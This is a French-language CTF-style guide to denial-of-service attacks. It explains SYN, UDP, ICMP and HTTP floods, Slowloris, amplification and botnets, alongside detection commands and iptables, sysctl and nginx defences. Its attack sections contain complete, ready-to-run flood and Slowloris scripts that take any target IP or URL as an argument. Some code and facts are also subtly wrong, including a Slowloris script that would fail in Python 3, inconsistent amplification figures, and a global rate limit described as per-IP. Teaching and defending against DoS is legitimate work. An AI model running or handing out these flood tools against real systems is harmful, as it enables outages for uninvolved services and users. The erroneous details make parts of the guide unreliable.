# Denial of Service (DoS) - Guide Complet pour CTF

Guide exhaustif sur les attaques Denial of Service (DoS) et Distributed Denial of Service (DDoS), avec explications techniques, outils, défenses et challenges pratiques.

---

## Table des matières

1. [Concepts Fondamentaux](#concepts-fondamentaux)
2. [Types d'Attaques DoS](#types-dattaques-dos)
3. [SYN Flood - Attaque détaillée](#syn-flood---attaque-détaillée)
4. [UDP Flood - Attaque détaillée](#udp-flood---attaque-détaillée)
5. [ICMP Flood - Attaque détaillée](#icmp-flood---attaque-détaillée)
6. [HTTP Flood - Attaque couche applicative](#http-flood---attaque-couche-applicative)
7. [Slowloris Attack](#slowloris-attack)
8. [Amplification Attacks](#amplification-attacks)
9. [DDoS - Attaques Distribuées](#ddos---attaques-distribuées)
10. [Détection des Attaques DoS](#détection-des-attaques-dos)
11. [Défenses contre DoS](#défenses-contre-dos)
12. [Outils pour tester DoS](#outils-pour-tester-dos)
13. [Challenges pratiques](#challenges-pratiques)
14. [Bonnes pratiques](#bonnes-pratiques)

---

## Concepts Fondamentaux

### Qu'est-ce qu'une attaque DoS ?

Une attaque **Denial of Service (DoS)** est une tentative malveillante de rendre un service, une application ou une machine **inaccessible** aux utilisateurs légitimes en :
- Surchargeant ses ressources (CPU, mémoire, bande passante)
- Exploitant des vulnérabilités logicielles
- Saturant sa file d'attente de connexions
- Consommant toute sa bande passante disponible

### Objectif d'une attaque DoS

```
État normal                 État sous attaque DoS
─────────────              ───────────────────
Serveur répond             Serveur saturé
aux requêtes ✅            ne répond plus ❌

CPU:      10%              CPU:      100%
Mémoire:  20%              Mémoire:  95%
Bande:    5MB/s            Bande:    1GB/s
Connexions: 100/10000      Connexions: 10000/10000 (PLEIN)
```

### Modèle OSI et couches d'attaque

```
┌─────────────────────────────────────────┐
│ Couche 7 - Application Layer            │ ← HTTP Flood, Slowloris
├─────────────────────────────────────────┤
│ Couche 6 - Presentation Layer           │
├─────────────────────────────────────────┤
│ Couche 5 - Session Layer                │
├─────────────────────────────────────────┤
│ Couche 4 - Transport Layer (TCP/UDP)    │ ← SYN Flood, UDP Flood
├─────────────────────────────────────────┤
│ Couche 3 - Network Layer (IP/ICMP)      │ ← ICMP Flood, IP Spoofing
├─────────────────────────────────────────┤
│ Couche 2 - Data Link Layer              │
├─────────────────────────────────────────┤
│ Couche 1 - Physical Layer               │
└─────────────────────────────────────────┘
```

### Ressources exhaustibles d'un serveur

```
CPU
├─ Traitement des paquets
├─ Traitement des requêtes
└─ Calculs applicatifs

Mémoire
├─ Stockage des états de connexion
├─ Buffers réseau
└─ Données applicatives

Bande passante
├─ Connexions entrantes
├─ Connexions sortantes
└─ Réponses aux requêtes

Connexions/Fichiers ouvertes
├─ Sockets TCP
├─ File d'attente de connexion (backlog)
└─ Descripteurs de fichiers
```

---

## Types d'Attaques DoS

### Classification par protocole

```
┌─────────────────────────────────────────────────┐
│          Attaques DoS - Classification          │
└─────────────────────────────────────────────────┘
              │
    ┌─────────┼──────────┬────────────┐
    │         │          │            │
Couche 3  Couche 4    Couche 7    Amplification
(Réseau)  (Transport) (App)       (Réflexion)
    │         │          │            │
    │         │          │      • DNS Amplification
    │         │          │      • NTP Amplification
    │         │          │      • SSDP Flood
    │         │          │
    │         │    • HTTP Flood
    │         │    • Slowloris
    │         │    • DNS Query
    │         │    • SMTP Flood
    │         │
    │    • SYN Flood
    │    • UDP Flood
    │    • ACK Flood
    │
  • ICMP Flood
  • IP Fragmentation
```

---

## SYN Flood - Attaque détaillée

### Fonctionnement normal du TCP Handshake

```
Étape 1 : SYN (Synchronization)
Client                                 Serveur
  │                                      │
  ├─ SYN (seq=X) ────────────────────►  │
  │                              Crée entrée dans SYN Queue
  │                                      │
  │  ◄──────────────── SYN-ACK (seq=Y)  │
  │                                      │
Étape 2 : ACK (Acknowledgement)         │
  │                                      │
  ├─ ACK (seq=Y+1) ───────────────────► │
  │                              Enlève de SYN Queue
  │                              Connexion établie ✅
  │ ◄─ Données ──────────────────────────
  │
Connexion établie, communication possible
```

### SYN Flood - Attaque

```
Attaquant (avec IP spoofée)            Serveur victime
  │                                      │
  ├─ SYN (seq=1, from_ip=fake1) ──────► │
  │                              Crée entrée SYN Queue
  │                                      │
  ├─ SYN (seq=2, from_ip=fake2) ──────► │
  │                              Crée entrée SYN Queue
  │                                      │
  ├─ SYN (seq=3, from_ip=fake3) ──────► │
  │                              Crée entrée SYN Queue
  │                                      │
  ├─ ... 10,000 SYN par seconde ──────► │
  │                                      │
  │                            SYN Queue saturée !
  │                            PLEINE (10,000/10,000)
  │                                      │
  │                            Utilisateur légitime :
  │                            ├─ SYN ──► REJETÉ ❌
  │                                      │
  │                            Ne peut pas se connecter
```

### Raison du succès de SYN Flood

```
1. IP Spoofing possible
   └─ Attaquant peut utiliser n'importe quelle adresse source
      Le serveur ne peut pas vérifier l'authenticité

2. Pas de vérification initiale du client
   └─ Le serveur crée une entrée avant de recevoir l'ACK
      Ressources allouées prématurément

3. Asymétrie de ressources
   └─ Attaquant : 1 paquet SYN = 1KB
      Serveur  : Allocation entry = 240 bytes
                 Mais stockage dans table = ressources
```

### Code d'attaque SYN Flood

```python
#!/usr/bin/env python3
"""
SYN Flood Attack Simulator
À utiliser SEULEMENT dans un environnement autorisé
"""

from scapy.all import IP, TCP, send, RandShort
import sys

def syn_flood(target_ip, target_port, packet_count=1000):
    """
    Lance une attaque SYN Flood
    
    Args:
        target_ip: IP du serveur à attaquer
        target_port: Port du serveur à attaquer
        packet_count: Nombre de paquets SYN à envoyer
    """
    
    print(f"[*] Démarrage SYN Flood contre {target_ip}:{target_port}")
    print(f"[*] Envoi de {packet_count} paquets SYN...")
    
    for i in range(packet_count):
        # Créer un paquet IP avec adresse source spoofée
        # Utiliser RandShort() pour générer des ports sources aléatoires
        
        paquet = IP(dst=target_ip, src="192.168.1.{0}".format(RandShort() % 254 + 1)) / \
                 TCP(dport=target_port, flags="S", seq=RandShort())
        
        # Envoyer le paquet sans attendre de réponse
        send(paquet, verbose=False)
        
        if (i + 1) % 100 == 0:
            print(f"[+] {i + 1} paquets SYN envoyés")
    
    print("[+] Attaque terminée !")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> [packet_count]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    packet_count = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
    
    syn_flood(target_ip, target_port, packet_count)
```

### Défense contre SYN Flood

#### 1. SYN Cookies

```bash
# Activer les SYN Cookies sur le serveur
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Rendre permanent
echo "net.ipv4.tcp_syncookies=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

**Comment ça marche:**
```
Normal:
SYN reçu → Crée entrée SYN Queue
Entrée consomme mémoire

Avec SYN Cookies:
SYN reçu → Envoie SYN-ACK avec numéro de séquence codé
           (contient info sur la connexion)
Pas d'allocation mémoire !
ACK reçu → Vérifie le numéro, extrait les infos
           Crée la connexion seulement si ACK valide
```

#### 2. Augmenter la SYN Queue

```bash
# Augmenter le backlog maximum
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096

# Rendre permanent
echo "net.ipv4.tcp_max_syn_backlog=4096" | sudo tee -a /etc/sysctl.conf
```

#### 3. Réduire le timeout SYN

```bash
# Réduire le temps d'attente pour les entrées SYN orphelines
sudo sysctl -w net.ipv4.tcp_synack_retries=2

# Rendre permanent
echo "net.ipv4.tcp_synack_retries=2" | sudo tee -a /etc/sysctl.conf
```

#### 4. Firewall - Rate Limiting

```bash
# Limiter les SYN par seconde depuis une IP
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```

---

## UDP Flood - Attaque détaillée

### Caractéristiques UDP

```
TCP                          UDP
───                          ───
Connexion requise            Pas de connexion
Fiable (garantit livraison)  Non fiable
Lent (établit connexion)     Rapide
Stateful                     Stateless

UDP = Plus facile pour DoS !
```

### Fonctionnement d'une attaque UDP Flood

```
Attaquant                    Serveur victime
   │                              │
   ├─ UDP paquet ─────────────►   │
   ├─ UDP paquet ─────────────►   │
   ├─ UDP paquet ─────────────►   │
   ├─ UDP paquet ─────────────►   │
   ├─ ... 100,000 UDP/sec ───►   │
   │                              │
   │                    Serveur surchargé :
   │                    ├─ CPU = 100%
   │                    ├─ Bande = épuisée
   │                    ├─ Paquets rejetés
   │                    └─ Services offline
```

### Avantages pour l'attaquant

```
1. Pas de handshake
   └─ Pas besoin d'établir connexion
      Envoi immédiat de paquets

2. Pas d'état à maintenir
   └─ Le serveur n'a pas besoin de tracker les connexions
      Mais reçoit quand même les paquets

3. Saturation de bande passante
   └─ Principal objectif
      Consommer toute la bande disponible

4. Saturation CPU/kernel
   └─ Traitement des paquets entrants
      Génération de réponses ICMP (port unreachable)
```

### Code d'attaque UDP Flood

```python
#!/usr/bin/env python3
"""
UDP Flood Attack Simulator
À utiliser SEULEMENT dans un environnement autorisé
"""

from scapy.all import IP, UDP, Raw, send
import sys
import random
import string

def udp_flood(target_ip, target_port, packet_count=10000, payload_size=1472):
    """
    Lance une attaque UDP Flood
    
    Args:
        target_ip: IP du serveur
        target_port: Port du serveur
        packet_count: Nombre de paquets UDP
        payload_size: Taille du payload (en bytes)
    """
    
    print(f"[*] Démarrage UDP Flood contre {target_ip}:{target_port}")
    print(f"[*] Payload size: {payload_size} bytes")
    print(f"[*] Envoi de {packet_count} paquets...")
    
    for i in range(packet_count):
        # Générer un payload aléatoire
        payload = ''.join(random.choices(string.ascii_letters + string.digits, 
                                        k=payload_size))
        
        # Créer le paquet UDP
        paquet = IP(dst=target_ip) / \
                 UDP(dport=target_port, sport=random.randint(1024, 65535)) / \
                 Raw(load=payload)
        
        # Envoyer
        send(paquet, verbose=False)
        
        if (i + 1) % 1000 == 0:
            print(f"[+] {i + 1} paquets envoyés")
    
    print("[+] Attaque terminée !")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> [count] [size]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 10000
    size = int(sys.argv[4]) if len(sys.argv) > 4 else 1472
    
    udp_flood(target_ip, target_port, count, size)
```

### Défense contre UDP Flood

#### 1. Rate Limiting UDP

```bash
# Limiter les paquets UDP entrants
sudo iptables -A INPUT -p udp -m limit --limit 100/sec --limit-burst 200 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP
```

#### 2. Filtrer les paquets inutiles

```bash
# Bloquer les paquets UDP vers des ports fermés
sudo iptables -A INPUT -p udp --dport 31337 -j DROP
```

#### 3. Augmenter les buffers réseau

```bash
# Augmenter la file d'attente de réception UDP
sudo sysctl -w net.core.rmem_max=134217728
sudo sysctl -w net.core.rmem_default=134217728

# Rendre permanent
echo "net.core.rmem_max=134217728" | sudo tee -a /etc/sysctl.conf
echo "net.core.rmem_default=134217728" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

---

## ICMP Flood - Attaque détaillée

### Protocol ICMP

```
ICMP (Internet Control Message Protocol)
└─ Utilisé pour :
   ├─ Diagnostic (ping)
   ├─ Signalement d'erreurs
   ├─ Tests de connectivité
   └─ Time exceeded, Destination unreachable, etc.
```

### Attaque ICMP Flood (Ping Flood)

```
Attaquant                    Serveur victime
   │                              │
   ├─ ICMP Echo Request ────────► │
   ├─ ICMP Echo Request ────────► │
   ├─ ICMP Echo Request ────────► │
   ├─ ... 100,000 ping/sec ────► │
   │                              │
   │                        Serveur occupé à :
   │                        ├─ Traiter les pings
   │                        ├─ Envoyer les réponses
   │                        ├─ Saturation bande
   │                        └─ CPU élevé
```

### Code d'attaque ICMP Flood

```python
#!/usr/bin/env python3
"""
ICMP Flood (Ping Flood) Attack Simulator
À utiliser SEULEMENT dans un environnement autorisé
"""

from scapy.all import IP, ICMP, send
import sys

def icmp_flood(target_ip, packet_count=10000):
    """
    Lance une attaque ICMP Flood (Ping Flood)
    
    Args:
        target_ip: IP du serveur
        packet_count: Nombre de pings
    """
    
    print(f"[*] Démarrage ICMP Flood (Ping Flood) contre {target_ip}")
    print(f"[*] Envoi de {packet_count} paquets ICMP Echo...")
    
    for i in range(packet_count):
        # Créer un paquet ICMP Echo Request
        paquet = IP(dst=target_ip) / ICMP(type=8, code=0)
        
        # Envoyer
        send(paquet, verbose=False)
        
        if (i + 1) % 1000 == 0:
            print(f"[+] {i + 1} paquets ICMP envoyés")
    
    print("[+] Attaque terminée !")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip> [count]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
    
    icmp_flood(target_ip, count)
```

### Défense contre ICMP Flood

#### 1. Bloquer ICMP complètement

```bash
# Bloquer tous les paquets ICMP
sudo iptables -A INPUT -p icmp -j DROP
```

#### 2. Limiter ICMP avec rate limiting

```bash
# Permettre quelques pings pour le diagnostic
sudo iptables -A INPUT -p icmp -m limit --limit 1/sec --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p icmp -j DROP
```

#### 3. Configuration système

```bash
# Ignorer les ping requests
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Rendre permanent
echo "net.ipv4.icmp_echo_ignore_all=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

---

## HTTP Flood - Attaque couche applicative

### Caractéristiques HTTP Flood

```
DoS Couche 3/4 (Basse couche)    DoS Couche 7 (HTTP Flood)
─────────────────────────        ──────────────────────
Attaquer réseau                  Attaquer application
Bloquer IP                        Requêtes valides
Difficile à distinguuer            Indistinguable du trafic normal
des vrais utilisateurs             Beaucoup plus difficile à défendre
```

### Fonctionnement d'une attaque HTTP Flood

```
Attaquant lance 10,000 "clients virtuels"    Serveur web
                                                │
    ├─ GET / HTTP/1.1 ──────────────────────► │
    ├─ GET / HTTP/1.1 ──────────────────────► │
    ├─ GET / HTTP/1.1 ──────────────────────► │
    ├─ GET /api/data HTTP/1.1 ────────────► │
    ├─ GET /index.html HTTP/1.1 ──────────► │
    ├─ ... 1000 requêtes/sec ─────────────► │
    │                                         │
    │                            Serveur surchargé :
    │                            ├─ Chaque requête = traitement app
    │                            ├─ Base de données = 100% CPU
    │                            ├─ RAM épuisée
    │                            ├─ Utilisateurs légitimes = timeout
    │                            └─ Service offline
```

### Différences : GET Flood vs POST Flood

```
GET Flood
─────────
GET / HTTP/1.1
Host: example.com
[Envoi immédiat]

Rapide à envoyer
Facile à générer
Peut être cachée dans les logs (beaucoup de requêtes)

POST Flood
──────────
POST /api/search HTTP/1.1
Host: example.com
Content-Length: 1000000

[Envoi 1MB de données]

Demande plus de ressources serveur
Base de données = requête plus lourde
Parsing des données = plus de CPU
```

### Code d'attaque HTTP Flood

```python
#!/usr/bin/env python3
"""
HTTP Flood Attack Simulator
À utiliser SEULEMENT dans un environnement autorisé
"""

import requests
import threading
import sys
import time

def http_flood(target_url, num_threads=100, requests_per_thread=100):
    """
    Lance une attaque HTTP Flood
    
    Args:
        target_url: URL du serveur (ex: http://10.0.0.2:31337)
        num_threads: Nombre de threads parallèles
        requests_per_thread: Requêtes par thread
    """
    
    def worker(thread_id):
        """Fonction worker pour chaque thread"""
        for i in range(requests_per_thread):
            try:
                # Envoyer une requête GET
                response = requests.get(target_url, timeout=1)
                
                if i == 0:
                    print(f"[+] Thread {thread_id}: Status {response.status_code}")
            
            except requests.exceptions.Timeout:
                pass  # Serveur saturé, continue
            except requests.exceptions.ConnectionError:
                pass  # Serveur offline, continue
            except Exception as e:
                pass  # Erreur, continue
    
    print(f"[*] Lancement HTTP Flood contre {target_url}")
    print(f"[*] Threads: {num_threads}")
    print(f"[*] Requêtes par thread: {requests_per_thread}")
    print(f"[*] Total requêtes: {num_threads * requests_per_thread}")
    
    threads = []
    start_time = time.time()
    
    # Créer et démarrer les threads
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(i,))
        threads.append(t)
        t.start()
    
    # Attendre que tous les threads se terminent
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    rps = (num_threads * requests_per_thread) / elapsed
    
    print(f"[+] Attaque terminée en {elapsed:.2f} secondes")
    print(f"[+] Débit: {rps:.0f} requêtes/seconde")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [threads] [requests]")
        sys.exit(1)
    
    target_url = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    requests_count = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    
    http_flood(target_url, threads, requests_count)
```

### Défense contre HTTP Flood

#### 1. Rate Limiting HTTP

```bash
# Limiter à 10 requêtes par seconde par IP
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 10/sec --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

#### 2. ModSecurity (Web Application Firewall)

```bash
# Installer ModSecurity sur Apache
sudo apt-get install libapache2-mod-security2 -y

# Activer le module
sudo a2enmod security2

# Configurer des règles custom
sudo nano /etc/apache2/mods-enabled/security2.conf
```

#### 3. Nginx Rate Limiting

```nginx
# nginx.conf
http {
    # Créer une zone de rate limiting
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;
    
    server {
        listen 80;
        server_name example.com;
        
        # Appliquer le rate limiting
        limit_req zone=general burst=20 nodelay;
        
        location /api/ {
            limit_req zone=api burst=50 nodelay;
        }
    }
}
```

#### 4. CloudFlare / CDN Protection

```
CloudFlare
└─ Absorbe le trafic attaque
   ├─ DDoS protection automatique
   ├─ Rate limiting transparent
   └─ Challenge les clients suspects
```

---

## Slowloris Attack

### Concept

Une attaque **Slowloris** ouvre une connexion HTTP et l'**garde ouverte aussi longtemps que possible** en envoyant des données très lentement.

### Mécanisme

```
Attaquant                          Serveur web
   │                                  │
   ├─ Ouvre connexion HTTP ────────► │
   │  POST / HTTP/1.1                 │
   │  Content-Length: 999999         │
   │                           Serveur attend le body
   │                           Garde la connexion ouverte
   │
   ├─ Envoie 1 byte ─────────────────► │
   │  (attends 30 secondes)       Serveur toujours en attente
   │                                   │
   ├─ Envoie 1 byte ─────────────────► │
   │  (attends 30 secondes)       Serveur toujours en attente
   │                                   │
   ├─ ... répète indéfiniment ──────► │
   │
   Attaquant ouvre 10,000 connexions comme ça
                                 Serveur = toutes les connexions ouvertes
                                 Pool de connexions = PLEIN
                                 Utilisateurs légitimes = Bloqués ❌
```

### Avantages de Slowloris

```
1. Pas besoin de beaucoup de bande passante
   └─ Seulement quelques bytes par minute

2. Pas détectable facilement par rate limiting bande
   └─ Traitement bande bloqué
      Mais connexions HTTP valides

3. Une seule machine peut saturer un serveur
   └─ N'a pas besoin de DDoS

4. Difficile à distinguer du trafic normal
   └─ Vraie connexion HTTP
      Vraie requête, juste lente
```

### Code Slowloris

```python
#!/usr/bin/env python3
"""
Slowloris Attack Simulator
À utiliser SEULEMENT dans un environnement autorisé
"""

import socket
import time
import sys

def slowloris_attack(target_host, target_port, num_connections=100, delay=30):
    """
    Lance une attaque Slowloris
    
    Args:
        target_host: Host du serveur
        target_port: Port HTTP
        num_connections: Nombre de connexions lentes
        delay: Délai entre les envois (secondes)
    """
    
    print(f"[*] Lancement Slowloris attack contre {target_host}:{target_port}")
    print(f"[*] Connexions: {num_connections}")
    print(f"[*] Délai entre envois: {delay} secondes")
    
    sockets = []
    
    # Ouvrir les connexions
    for i in range(num_connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_host, target_port))
            
            # Envoyer une requête HTTP incomplète
            request = b"POST / HTTP/1.1\r\n"
            request += b"Host: {0}\r\n".format(target_host.encode())
            request += b"User-Agent: Mozilla/5.0\r\n"
            request += b"Content-Length: 999999\r\n"
            request += b"Connection: keep-alive\r\n"
            request += b"\r\n"
            
            sock.send(request)
            sockets.append(sock)
            
            if (i + 1) % 10 == 0:
                print(f"[+] {i + 1} connexions ouvertes")
        
        except Exception as e:
            print(f"[-] Erreur ouverture connexion: {e}")
    
    print(f"[+] {len(sockets)} connexions ouvertes")
    print(f"[*] Envoi de données lentement...")
    
    # Garder les connexions ouvertes
    try:
        while True:
            for sock in sockets:
                try:
                    # Envoyer un byte très lentement
                    sock.send(b"X")
                except:
                    pass
            
            # Attendre avant le prochain envoi
            time.sleep(delay)
    
    except KeyboardInterrupt:
        print("\n[*] Arrêt de l'attaque")
        for sock in sockets:
            sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port> [connections] [delay]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    connections = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    delay = int(sys.argv[4]) if len(sys.argv) > 4 else 30
    
    slowloris_attack(host, port, connections, delay)
```

### Défense contre Slowloris

#### 1. Réduire les timeouts

```bash
# Apache
sudo nano /etc/apache2/mods-enabled/reqtimeout.conf

# Ajouter:
# RequestReadTimeout header=20 body=20
```

#### 2. Augmenter le nombre de workers

```bash
# Apache - mod_mpm_prefork
<IfModule mpm_prefork_module>
    MaxRequestWorkers 500  # Au lieu de 256 par défaut
</IfModule>
```

#### 3. Firewall - Bloquer les connexions lentes

```bash
# Bloquer après X secondes de non-activité
sudo iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
```

---

## Amplification Attacks

### Concept

Une attaque **amplification** utilise un **serveur tiers** (réflecteur) pour amplifier l'attaque en renvoyant une grosse réponse.

### Schéma

```
Attaquant             Serveur Réflecteur        Victime
    │                      │                       │
    ├─ Requête ────────►   │                       │
    │ (spoofée avec       │                       │
    │  IP victime)        │                       │
    │                      │                       │
    │                      ├─ Grosse réponse ────► │
    │                      │ (10x plus gros)      │
    │                      │                       │
Attaquant envoie         Le réflecteur amplifie   Victime
1 paquet = 100 bytes     et envoie 1000 bytes     reçoit
                                                  attaque massive
```

### Types d'amplification populaires

#### DNS Amplification

```
Attaquant                DNS Server              Victime (10.0.0.2)
    │                        │                       │
    ├─ DNS Query: ".*" ──►  │
    │ (spoofé 10.0.0.2)     │
    │                        │
    │                        ├─ Grosse réponse ───► │
    │                        │ (60+ bytes)          │
    │
Ratio amplification: 60x
```

#### NTP Amplification

```
Attaquant                NTP Server              Victime
    │                        │                      │
    ├─ monlist request ──►  │
    │ (spoofé victime)      │
    │                        │
    │                        ├─ Réponse massive ──► │
    │                        │ (4700+ bytes)        │
    │
Ratio amplification: 556x (TRÈS efficace!)
```

#### SSDP Amplification

```
Attaquant                SSDP Server             Victime
    │                        │                      │
    ├─ M-SEARCH ───────────► │
    │ (spoofé victime)      │
    │                        │
    │                        ├─ Réponse UDP ──────► │
    │                        │ (1000+ bytes)        │
    │
Ratio amplification: 30x
```

### Détection d'amplification attacks

```bash
# Voir les réponses volumineuses depuis des IPs externes
sudo tcpdump -i eth0 -n "src 8.8.8.8 and dst 10.0.0.2" | head -20

# Voir le DNS traffic suspect
sudo tcpdump -i eth0 -n "udp port 53" | head -20

# Voir les réponses NTP suspectes
sudo tcpdump -i eth0 -n "udp port 123"
```

### Défense contre amplification attacks

#### 1. Bloquer les sources externes

```bash
# Bloquer les DNS responses de l'extérieur
sudo iptables -A INPUT -p udp --sport 53 -m state --state NEW -j DROP

# Permettre les DNS responses pour ses propres requêtes
sudo iptables -A INPUT -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
```

#### 2. Limiter les réponses

```bash
# Configurer le DNS server pour limiter les réponses
# Dans bind9: /etc/bind/named.conf

acl trusted {
    10.0.0.0/24;  // Seulement le réseau local peut faire du monlist
};

options {
    allow-query { any; };
    allow-recursion { trusted; };  // Seulement les trusted
};
```

#### 3. Rate limiting UDP

```bash
# Limiter les réponses UDP
sudo iptables -A INPUT -p udp -m limit --limit 100/sec --limit-burst 200 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP
```

---

## DDoS - Attaques Distribuées

### Différence DoS vs DDoS

```
DoS (Denial of Service)
└─ Une source unique attaque une cible
   Facile à détecter et bloquer
   Exemple: Une machine attaque un serveur

DDoS (Distributed DoS)
└─ Plusieurs sources attaquent simultanément
   Difficile à bloquer (bloquer une source ne suffit pas)
   Exemple: 10,000 machines compromise attaquent un serveur

Attaquant → Botnet → 10,000 machines → Serveur victime
```

### Botnet - Architecture

```
         Attaquant (C&C server)
              │
    ┌─────────┼─────────┐
    │         │         │
   Bot 1    Bot 2     Bot 3
    │         │         │
    ├─ Machine compromise 1
    ├─ Machine compromise 2
    ├─ Machine compromise 3
    ├─ ...
    └─ Machine compromise 10,000

Tous les bots reçoivent l'ordre:
"Attaque 10.0.0.2 maintenant"

Serveur reçoit trafic de 10,000 sources différentes
Impossible à bloquer par IP
Dégâts massifs
```

### Types d'attaques DDoS courants

#### 1. Volumetric DDoS (Amplification)
```
Objectif: Saturer la bande passante
Taille: Très gros volumes (Gbps+)
Exemple: NTP amplification attack avec 10,000 sources
```

#### 2. Protocol DDoS (SYN Flood distribué)
```
Objectif: Épuiser les ressources réseau
Taille: Moins gros mais sophistiqué
Exemple: SYN Flood depuis 1,000 sources
```

#### 3. Application DDoS (Slowloris distribué)
```
Objectif: Épuiser les ressources applicatives
Taille: Petit volume mais très efficace
Exemple: 10,000 connexions Slowloris depuis machines différentes
```

### Défense contre DDoS

#### 1. Anycast Mitigation

```
Normal:
Client → ISP → Serveur
       (une route)

Anycast:
Client 1 ─┐
          ├─► POP nearest (datacenter)
Client 2 ─┤
          ├─► POP nearest (datacenter)
Client 3 ─┘

Distribue l'attaque sur plusieurs datacenters
```

#### 2. Rate Limiting Coordonné

```bash
# Sur chaque serveur
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 1000/sec -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

#### 3. BGP Blackholing

```
En cas d'attaque massive:
├─ Annoncer la route sous attaque via BGP
├─ Blackhole les paquets au niveau ISP
└─ Trafic attaque arrêté avant d'atteindre le serveur

Sacrifice la disponibilité mais protège l'infrastructure
```

#### 4. Services DDoS Protection

```
Akamai, Cloudflare, AWS Shield:
├─ Absorbe l'attaque sur des datacenters massifs
├─ Filtre le trafic automatiquement
├─ Laisse passer que le trafic légitime
└─ Serveur reçoit le trafic clean
```

---

## Détection des Attaques DoS

### Signes d'une attaque DoS en cours

```
Monitoring CPU
└─ CPU soudainement 100%
   └─ Sans augmentation proportionnelle du trafic légitime

Monitoring Mémoire
└─ Mémoire monte rapidement
   └─ Remplie par les états de connexion (SYN queue)

Monitoring Bande Passante
└─ Saturation soudaine
   └─ Beaucoup plus de trafic que d'habitude

Monitoring Connexions
└─ Nombre de connexions explosif
   └─ Milliers de connexions nouvelles par seconde

Monitoring Application
└─ Temps de réponse augmente
   └─ Requêtes en timeout
   └─ Erreurs 503 Service Unavailable
```

### Commandes de diagnostic

```bash
# 1. Voir les connexions en temps réel
sudo netstat -an | wc -l
# Nombre total de connexions

# 2. Voir les connexions SYN_RECV (attaque SYN Flood)
sudo netstat -an | grep SYN_RECV | wc -l

# 3. Voir les connexions par IP
sudo netstat -an | awk '{print $5}' | grep -oP '^\d+\.\d+\.\d+\.\d+' | sort | uniq -c | sort -rn

# 4. Voir le trafic réseau
ss -s

# 5. Capturer les paquets suspects
sudo tcpdump -i eth0 -n "tcp[tcpflags] & tcp-syn != 0" | head -50

# 6. Voir les connexions en attente (ESTABLISHED)
sudo netstat -an | grep ESTABLISHED | wc -l

# 7. Monitorer le trafic en temps réel
watch -n 1 'netstat -an | grep ESTABLISHED | wc -l'

# 8. Voir les connexions par port
sudo netstat -an | grep LISTEN
```

### Monitoring automatisé

```bash
#!/bin/bash
# dos_monitor.sh - Script de monitoring DoS

while true; do
    echo "=== $(date) ==="
    
    # Connexions totales
    total=$(netstat -an | wc -l)
    echo "Connexions totales: $total"
    
    # Connexions SYN_RECV (SYN Flood)
    syn_recv=$(netstat -an | grep SYN_RECV | wc -l)
    echo "SYN_RECV: $syn_recv"
    
    if [ $syn_recv -gt 100 ]; then
        echo "⚠️  ALERTE: Possible SYN Flood!"
    fi
    
    # Top 5 IPs
    echo "Top 5 IPs:"
    netstat -an | awk '{print $5}' | grep -oP '^\d+\.\d+\.\d+\.\d+' | \
    sort | uniq -c | sort -rn | head -5
    
    # Usage CPU/Memory
    echo "CPU/Memory:"
    top -bn1 | head -3
    
    echo ""
    sleep 5
done
```

---

## Défenses contre DoS

### Défense Couche 3/4 (Réseau)

```bash
# 1. SYN Cookies
sudo sysctl -w net.ipv4.tcp_syncookies=1

# 2. Augmenter SYN Queue
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096

# 3. Rate limiting avec iptables
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# 4. Réduire timouts
sudo sysctl -w net.ipv4.tcp_synack_retries=2

# 5. Firewall stateful
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -m state --state INVALID -j DROP
```

### Défense Couche 7 (Application)

```bash
# 1. Nginx rate limiting
# Dans nginx.conf:
limit_req_zone $binary_remote_addr zone=http:10m rate=10r/s;

# 2. Timeouts agressifs
proxy_connect_timeout 5s;
proxy_send_timeout 5s;
proxy_read_timeout 5s;

# 3. Connection limits
limit_conn addr 10;  # Max 10 connexions par IP

